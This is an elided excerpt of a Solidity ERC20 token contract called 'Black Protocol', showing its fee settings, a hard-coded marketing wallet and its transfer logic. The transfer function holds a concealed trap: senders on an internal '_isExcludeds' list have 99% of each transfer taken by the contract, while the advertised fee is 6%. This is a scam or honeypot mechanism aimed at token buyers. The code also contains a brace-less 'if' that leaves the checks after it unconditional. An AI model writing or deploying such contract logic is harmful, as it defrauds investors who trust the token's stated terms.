...
contract Contract is Context, IERC20 { 
    string private _name = "Black Protocol";
    string private _symbol = unicode"BLACKP";
    ...
    uint256 public _buy_free = 6;
    uint256 public _sell_free = 6;

    uint8 private _bTxCount = 0;
    uint8 private _sTxCount = 0;
    uint256 public _swapTrigger = 5;
    uint256 public _swapTokenAtAmount = _tTotal * 20 / 2023;

    address payable public MarketingWallet = payable(0x2a2eb3C28E21Fe69B3AccA991895Eb64337cc062);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to])
            require(amount <= _maxTransactionAmt, "You are trying to buy more than the max transaction limit.");
            require(from != address(0) && to != address(0), "ERR: Using 0 address!");
            require(amount > 0, "Token value must be higher than zero.");
        if (!tradingActive) {require(_isExcludedFromFee[from] || _isExcludedFromFee[to],"Trading is not active.");}
        if (transferDelay && tradingActiveBlock +1 <= block.number) {rescued();}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){ _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount); } 
            else if (isBuy){ uint256 buyAmt = tAmount*_buy_free/100; uint256 tTransfesellAmt = tAmount-buyAmt;
            _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tTransfesellAmt;
            _tOwned[address(this)] = _tOwned[address(this)]+buyAmt;   
            emit Transfer(sender, recipient, tTransfesellAmt);} 
            else { uint256 sellAmt; if (_isExcludeds[sender]){sellAmt = tAmount*99/100;}
            else if (recipient == uniswapV2Pair){sellAmt = tAmount*_sell_free/100;}
            uint256 tTransfesellAmt = tAmount-sellAmt;
            _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tTransfesellAmt;
            _tOwned[address(this)] = _tOwned[address(this)]+sellAmt;   
            emit Transfer(sender, recipient, tTransfesellAmt);
        }
    }
